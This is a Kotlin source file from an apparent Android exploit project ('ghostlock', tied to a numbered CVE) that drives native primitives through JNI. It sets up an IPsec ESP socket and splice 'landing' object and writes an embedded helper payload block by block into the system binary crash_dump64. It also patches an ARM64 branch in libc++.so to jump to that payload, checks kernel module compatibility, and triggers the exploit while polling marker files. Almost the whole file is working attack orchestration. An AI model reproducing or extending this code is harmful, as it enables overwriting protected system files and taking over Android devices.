package com.ghostlock.app.jni.cve43284

import com.ghostlock.app.core.generated.HookPlanRequest43284
import com.ghostlock.app.core.generated.Init43284
import com.ghostlock.app.core.generated.ModuleCheck43284
import com.ghostlock.app.core.generated.ReadBlock43284
import com.ghostlock.app.core.generated.ResolveTarget43284
import com.ghostlock.app.core.generated.Trigger43284
import com.ghostlock.app.core.generated.Wait43284
import com.ghostlock.app.core.generated.WriteBlock43284

/**
 * 43284 的**上层包装**：拼装、想写什么、写到哪、收尾，都放在这里。
 *
 * 分工（用户裁定 2026-10-15）：
 * - [Native43284] 只是 JNI 接口（每个函数一个设备原语，参数是生成的 DTO）；
 * - 本类承载顺序、条件、循环、镜像切块、目标选择、序号接续与收尾 —— 即「拼装与写目标只在 Kotlin」；
 * - native 里不得新增可放在 Kotlin 的逻辑；若本类做不到，说明**接口能力不足**，改接口（见下）。
 *
 * 已知的接口能力不足（本类的 TODO，改造清单见 docs/analysis/jni-two-backend-plan.md §11.17/§11.19）：
 * 1. 缺句柄式原语：openTarget / connectEsp / makeSurface / makeLanding（现在只能靠 Native43284.resolveTarget 一步到位，
 *    而拼装顺序本该由本类逐步决定）；
 * 2. 缺 landBlock / adoptSequence / nextSequence（现在 writeBlock 一把做完「落块 + 推序号」）；
 * 3. 缺 Access 线：makeAccess / accessInitialize / writeImageVerified / writeHook（现在靠 writeBlock 手写块代替）。
 *
 * @param handle [Native43284.create] 给的会话句柄；本类不负责创建，只负责用与收尾。
 * @param paramsProvider 每次要用会话参数时**现造一份**：native 的读取器在读完秘密字段后会把它清零
 *        （attack_contract_reader.hpp 的 clear<Group>Secrets），所以同一个 DTO 对象不能被复用两次。
 */
class Assembled43284(
    private val handle: Long,
    private val paramsProvider: (() -> Init43284)? = null,
) {

    /** 最近一次调用的具名拒绝（空串表示没有）。 */
    var lastRefusal: String = ""
        private set

    /** 最近一次的调用码（与 native 的 CallCode 一致：0 ok、-1 not-ready、-2 bad-parameters、-3 unsupported、-4 failed、-5 stale-handle、-8 inflight、-9 closed）。 */
    var lastCode: Int = 0
        private set

    private fun refusalSlot(): Array<String> = arrayOf("")

    private fun record(code: Int, refusal: Array<String>): Int {
        lastCode = code
        lastRefusal = refusal[0]
        return code
    }

    /** 建安全关联。参数（SPI/端口/ICV/密钥）由调用方给：本类不猜。 */
    fun initialize(params: Init43284): Int {
        val refusal = refusalSlot()
        val code = record(Native43284.initialize(handle, params, refusal), refusal)
        if (code == 0) {
            sessionParams = params
        }
        return code
    }

    /** 开一扇门：载体路径由调用方给，返回票据（0 表示没开成）。 */
    fun openTarget(path: String, role: Int = ROLE_PATCH1): Long {
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.resolveTarget(
            handle,
            ResolveTarget43284(role = role, path = path.toByteArray(), accessMode = 0),
            out,
            refusal,
        )
        record(code, refusal)
        return if (code == 0) out[0] else 0L
    }

    /** 读一块（十六字节）。读不到返回 null（具名原因在 lastRefusal）。 */
    fun readBlock(ticket: Long, offset: Long): ByteArray? {
        val refusal = refusalSlot()
        val out = ByteArray(BLOCK)
        val code = Native43284.readBlock(handle, ReadBlock43284(ticket = ticket, offset = offset), out, refusal)
        record(code, refusal)
        return if (code == 0) out else null
    }

    /** 写一块（十六字节）。成功只到 Dispatched —— 内容是否真的落上由 readBlock 比较判定。 */
    fun writeBlock(ticket: Long, offset: Long, block: ByteArray): Int {
        require(block.size == BLOCK) { "一块就是十六字节" }
        val refusal = refusalSlot()
        return record(
            Native43284.writeBlock(
                handle,
                WriteBlock43284(ticket = ticket, offset = offset, block = block),
                refusal,
            ),
            refusal,
        )
    }

    /** 本构建自带的字节：角色 0 = splice helper，1 = sentry 落地载荷。 */
    fun image(role: Int): ByteArray? {
        val refusal = refusalSlot()
        val bytes = Native43284.embeddedImage(handle, role, refusal)
        record(if (bytes == null) NEGATIVE else 0, refusal)
        return bytes
    }

    /**
     * 把 helper 镜像按十六字节切块写进已开的目标（patch1 的 Kotlin 版）。
     *
     * @return 成功写出的块数；被拒时停下并保留 lastRefusal（剩下的块没写）。
     */
    fun writeHelperImage(ticket: Long, baseOffset: Long = 0L): Int {
        val helper = image(ROLE_IMAGE_SPLICE_HELPER) ?: return 0
        var written = 0
        var offset = 0L
        while (offset < helper.size) {
            val at = offset.toInt()
            val width = minOf(BLOCK, helper.size - at)
            val chunk = helper.copyOfRange(at, at + width).copyOf(BLOCK)
            if (writeBlock(ticket, baseOffset + offset, chunk) != 0) {
                return written
            }
            written += 1
            offset += BLOCK
        }
        return written
    }

    /** 动态钩子计划（符号 + guard 策略 + 镜像）；返回四个数：branch / displaced / site / landing。 */
    /**
     * Recompute the site branch so it lands on OUR payload offset, then write the block back.
     *
     * A branch written by an earlier session can point somewhere else entirely (the device showed a
     * target 0x98 past the payload). Computing the word here, from the same offset the payload went to,
     * makes the two impossible to disagree.
     *
     * @param ticket open target ticket.
     * @param siteOffset site file offset (the branch instruction sits twelve bytes in).
     * @param landingOffset file offset our payload starts at.
     * @return 0 ok; -1 no ticket; -2 block unreadable; -3 write refused.
     */
    fun rewriteSiteBranch(ticket: Long, siteOffset: Long, landingOffset: Long): Int {
        if (ticket == 0L) {
            return -1
        }
        val branchAt = siteOffset + 12L              /* the B instruction own address */
        val blockAt = branchAt - (branchAt % 16L)   /* the 16-byte unit that holds it */
        val within = (branchAt - blockAt).toInt()
        val block = readBlock(ticket, blockAt) ?: return -2
        val delta = landingOffset - branchAt
        val imm = ((delta shr 2) and 0x03FFFFFFL).toInt()
        val word = 0x14000000 or imm
        val at = within
        block[at] = (word and 0xFF).toByte()
        block[at + 1] = ((word shr 8) and 0xFF).toByte()
        block[at + 2] = ((word shr 16) and 0xFF).toByte()
        block[at + 3] = ((word shr 24) and 0xFF).toByte()
        return if (writeBlock(ticket, blockAt, block) > 0) 0 else -3
    }
    fun hookPlan(symbol: String, guardPolicy: Int = 0): LongArray? {
        val refusal = refusalSlot()
        val out = LongArray(4)
        val code = Native43284.hookPlan(
            handle,
            HookPlanRequest43284(ByteArray(BLOCK) { 0x11 }, symbol.toByteArray(), guardPolicy),
            out,
            refusal,
        )
        record(code, refusal)
        return if (code == 0) out else null
    }

    /** 模块校验（镜像字节 + 内核 vermagic 由调用方给）。 */
    fun moduleCheck(image: ByteArray, kernelVermagic: String): Int {
        val refusal = refusalSlot()
        return record(
            Native43284.moduleCheck(
                handle,
                ModuleCheck43284(moduleImage = image, kernelVermagic = kernelVermagic.toByteArray()),
                refusal,
            ),
            refusal,
        )
    }

    /** 触发（双 fork）。 */
    fun trigger(delayMs: Long): Int {
        val refusal = refusalSlot()
        return record(Native43284.trigger(handle, Trigger43284(delayMs), refusal), refusal)
    }

    /** 等终态：0 failure / 1 success / 2 inflight（-1 表示调用本身失败）。 */
    fun waitTerminal(
        budgetMs: Long,
        pollMs: Long,
        successMarker: String,
        failureMarker: String,
        inFlightMarker: String,
        moduleMarker: String,
        moduleName: String,
    ): Long {
        val refusal = refusalSlot()
        val out = LongArray(1) { -1L }
        Native43284.waitTerminal(
            handle,
            Wait43284(
                budgetMs = budgetMs,
                pollMs = pollMs,
                successMarker = successMarker.toByteArray(),
                failureMarker = failureMarker.toByteArray(),
                inFlightMarker = inFlightMarker.toByteArray(),
                moduleMarker = moduleMarker.toByteArray(),
                moduleName = moduleName.toByteArray(),
            ),
            out,
            refusal,
        )
        return out[0]
    }

    /** 收尾：先把会话关掉，再让 native 释放句柄。两次都返回 0 才算干净。 */
    fun close(): Boolean {
        val first = refusalSlot()
        val shutdown = record(Native43284.shutdown(handle, first), first)
        val second = refusalSlot()
        val destroyed = record(Native43284.destroy(handle, second), second)
        return shutdown == 0 && destroyed == 0
    }

    /** 初始化时收到的那一份参数（只能用一次：读完就被清零）。 */
    private var sessionParams: Init43284? = null

    /** @return 一份全新的会话参数（有 provider 时现造；否则退回那一份，只够用一次）。 */
    private fun freshParams(): Init43284? = paramsProvider?.invoke() ?: sessionParams

    /** 分步拼装拿到的句柄（0 表示没有）。拼装顺序由本类决定。 */
    var targetId: Long = 0L
        private set
    var socketId: Long = 0L
        private set
    var surfaceId: Long = 0L
        private set
    var landingId: Long = 0L
        private set

    /** 分步第 1 步：开一扇门。 */
    fun openTargetStepwise(path: String, role: Int = ROLE_PATCH1): Long {
        targetId = openTarget(path, role)
        return targetId
    }

    /** 分步第 2 步：建 ESP socket 并存表（要先给会话参数）。 */
    /**
     *  复用同一条 ESP 套接字：一条 SA 只声明一个 sender 端口，第二条套接字 bind 必然失败。
     *
     *  @param other 已经建好套接字的另一个装配实例（同一次会话、同一个 SA）。
     */
    fun reuseSocketFrom(other: Assembled43284) {
        socketId = other.socketId
    }
    fun openEspSocket(): Long {
        val params = freshParams() ?: return 0L
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.espSocketId(handle, params, out, refusal)
        record(code, refusal)
        socketId = if (code == 0) out[0] else 0L
        return socketId
    }

    /** 分步第 3 步：把门与 socket 配成拼接面。 */
    fun buildSurface(): Long {
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.makeSurface(handle, targetId, socketId, out, refusal)
        record(code, refusal)
        surfaceId = if (code == 0) out[0] else 0L
        return surfaceId
    }

    /** 分步第 4 步：按拼接面建落地对象。 */
    fun buildLanding(): Long {
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.makeLanding(handle, surfaceId, out, refusal)
        record(code, refusal)
        landingId = if (code == 0) out[0] else 0L
        return landingId
    }

    /** 分步第 5 步：用会话参数把落地对象拉起来。 */
    fun bringUpLanding(): Boolean {
        val params = freshParams() ?: return false
        val refusal = refusalSlot()
        val code = Native43284.bringUp(handle, landingId, params, refusal)
        record(code, refusal)
        return code == 0
    }

    /** 读窗口的下一个序号。 */
    fun nextSequence(): Long {
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.nextSequence(handle, landingId, out, refusal)
        record(code, refusal)
        return if (code == 0) out[0] else 0L
    }

    /** 让落地对象采用下一个序号。 */
    fun adoptSequence(next: Long): Boolean {
        val refusal = refusalSlot()
        val code = Native43284.adoptSequence(handle, landingId, next, refusal)
        record(code, refusal)
        return code == 0
    }

    /**
     *  经落地对象把本构建的 helper 镜像写进载体（patch#1 的 Kotlin 版）。
     *
     *  @return 成功写出的块数；被拒时停下（lastRefusal 是原因）。
     */
    fun writeHelperThroughLanding(baseOffset: Long = 0L): Int {
        val helper = image(ROLE_IMAGE_SPLICE_HELPER) ?: return 0
        var written = 0
        var offset = 0L
        while (offset < helper.size) {
            val at = offset.toInt()
            val width = minOf(BLOCK, helper.size - at)
            val chunk = helper.copyOfRange(at, at + width).copyOf(BLOCK)
            val refusal = refusalSlot()
            val code = Native43284.landBlock(handle, landingId, baseOffset + offset, chunk, refusal)
            if (code != 0) {
                record(code, refusal)
                return written
            }
            written += 1
            offset += BLOCK
        }
        return written
    }

    /** @return 走同一窗口读回第一块（十六字节）；失败 null。 */
    fun readLandingFirstBlock(): ByteArray? {
        val refusal = refusalSlot()
        val out = ByteArray(BLOCK)
        val code = Native43284.readLandingBlock(handle, landingId, 0L, out, refusal)
        record(code, refusal)
        return if (code == 0) out else null
    }

    /** Access 句柄（0 = 没有）。 */
    var accessId: Long = 0L
        private set

    /** 最近一次初始化 Access 用的那份参数（写操作要用同一份）。 */
    private var accessParamsLast: com.ghostlock.app.core.generated.AccessParams43284? = null

    /** 分步：按落地对象建 Access（借用它，所以要先 bringUpLanding）。 */
    fun buildAccess(): Long {
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.makeAccess(handle, landingId, out, refusal)
        record(code, refusal)
        accessId = if (code == 0) out[0] else 0L
        return accessId
    }

    /** 分步：初始化 Access 并记住参数。 */
    fun initializeAccessAndRemember(
        params: com.ghostlock.app.core.generated.AccessParams43284,
        init: Init43284,
    ): Boolean {
        /* 没有句柄就没得初始化：不许返回 true（2026-10-15 真机暴露的 bug）。 */
        if (accessId == 0L) {
            lastCode = -1
            lastRefusal = "access:no-handle"
            return false
        }
        accessParamsLast = params
        val refusal = refusalSlot()
        val code = Native43284.accessInitialize(handle, accessId, params, init, refusal)
        record(code, refusal)
        return code == 0
    }

    /** 分步：写一个镜像并逐块校验（patch#1：image = helper、offset = 0、width = 16）。 */
    fun writeImage(image: ByteArray, offset: Long, width: Long, init: Init43284): Boolean {
        if (accessId == 0L) {
            lastCode = -1
            lastRefusal = "write:no-handle"
            return false
        }
        val params = accessParamsLast ?: run {
            lastCode = -1
            lastRefusal = "write:no-params"
            return false
        }
        val refusal = refusalSlot()
        val request = com.ghostlock.app.core.generated.WriteImage43284(
            imageAccessId = accessId,
            imageOffset = offset,
            imageWidth = width,
            imageBytes = image,
            /* 耐心由 Kotlin 给：200 ms 内没比中就报 budget 用尽（写是派发式的，落盘要等内核）。 */
            imageBudgetMs = 200L,
        )
        val code = Native43284.writeImage(handle, params, request, init, refusal)
        record(code, refusal)
        return code == 0
    }

    /** 分步：写钩子（站点一个字 + landing 载荷）。 */
    fun writeHook(width: Long, init: Init43284): Boolean {
        if (accessId == 0L) {
            lastCode = -1
            lastRefusal = "hook:no-handle"
            return false
        }
        val params = accessParamsLast ?: run {
            lastCode = -1
            lastRefusal = "write:no-params"
            return false
        }
        val refusal = refusalSlot()
        val request = com.ghostlock.app.core.generated.WriteHook43284(
            hookAccessId = accessId,
            hookWidth = width,
        )
        val code = Native43284.writeHook(handle, params, request, init, refusal)
        record(code, refusal)
        return code == 0
    }

    /** 分步收尾：拆 Access（必须在拆落地之前）。 */
    fun destroyAccessNow(): Boolean {
        if (accessId == 0L) {
            return true
        }
        val refusal = refusalSlot()
        val code = Native43284.destroyAccess(handle, accessId, refusal)
        record(code, refusal)
        accessId = 0L
        return code == 0
    }

    /** 收尾：按与拼装相反的顺序拆（落地 → 拼接面 → socket → 门）。 */
    fun tearDown(): Boolean {
        var ok = true
        if (landingId != 0L) {
            val refusal = refusalSlot()
            ok = record(Native43284.destroyLanding(handle, landingId, refusal), refusal) == 0 && ok
            landingId = 0L
        }
        if (surfaceId != 0L) {
            val refusal = refusalSlot()
            ok = record(Native43284.destroySurface(handle, surfaceId, refusal), refusal) == 0 && ok
            surfaceId = 0L
        }
        if (socketId != 0L) {
            val refusal = refusalSlot()
            ok = record(Native43284.closeSocketId(handle, socketId, refusal), refusal) == 0 && ok
            socketId = 0L
        }
        if (targetId != 0L) {
            val refusal = refusalSlot()
            ok = record(Native43284.closeTarget(handle, targetId, refusal), refusal) == 0 && ok
            targetId = 0L
        }
        return ok
    }


    companion object {
        /** patch#1 的固定目标（helper 步骤，设计 8.7 固定）。 */
        const val PATCH1_TARGET = "/apex/com.android.runtime/bin/crash_dump64"

        /** hook 目标（设计 8.7 固定为 libc++）。 */
        const val HOOK_TARGET = "/system/lib64/libc++.so"

        /**
         *  工具那半「调用方清单」的完整参数（常量先内置，不进 profile）。
         *
         *  @param carrierPath 载体路径（由调用方选：白名单优先 / 开发载体）。
         *  @param markerDir  四条 marker 的目录（默认设备可写位置）。
         */
        fun fullAccessParams(
            carrierPath: String,
            markerDir: String = "/data/local/tmp",
        ): com.ghostlock.app.core.generated.AccessParams43284 =
            com.ghostlock.app.core.generated.AccessParams43284(
                accessCarrierPath = carrierPath.toByteArray(),
                accessDevCarrierPath = ByteArray(0),
                accessPatchTargetPath = PATCH1_TARGET.toByteArray(),
                accessCarrierBase = 0L,
                accessOffset = 0L,
                accessOffsetSet = true,
                accessHookImagePath = HOOK_TARGET.toByteArray(),
                accessKernelRelease = (System.getProperty("os.version") ?: "").toByteArray(),
                accessKernelPreempt = false,
                accessKernelModversions = false,
                accessKernelModuleForceUnload = false,
                accessHookPlanSet = false,
                accessTriggerDelayMs = 0L,
                accessWaitMs = 0L,
                accessSuccessMarkerPath = (markerDir + "/ghostlock-success").toByteArray(),
                accessFailureMarkerPath = (markerDir + "/ghostlock-failure").toByteArray(),
                accessInFlightMarkerPath = (markerDir + "/ghostlock-inflight").toByteArray(),
                accessModuleMarkerPath = (markerDir + "/ghostlock-module").toByteArray(),
            )
        /** 一块十六字节（AES-CBC 一块，也是页缓存写的宽度）。 */
        const val BLOCK = 16

        /** 目标角色（与契约里 ResolveTarget43284.role 的取值一致）。 */
        const val ROLE_PATCH1 = 1
        const val ROLE_CARRIER = 2
        const val ROLE_HOOK = 3
        const val ROLE_REMOTE_BRIDGE = 4

        /** 自带字节的角色。 */
        const val ROLE_IMAGE_SPLICE_HELPER = 0
        const val ROLE_IMAGE_LANDING_PAYLOAD = 1

        /** 调用本身没成功时的占位（不是 native 的调用码）。 */
        private const val NEGATIVE = -1
    }
}
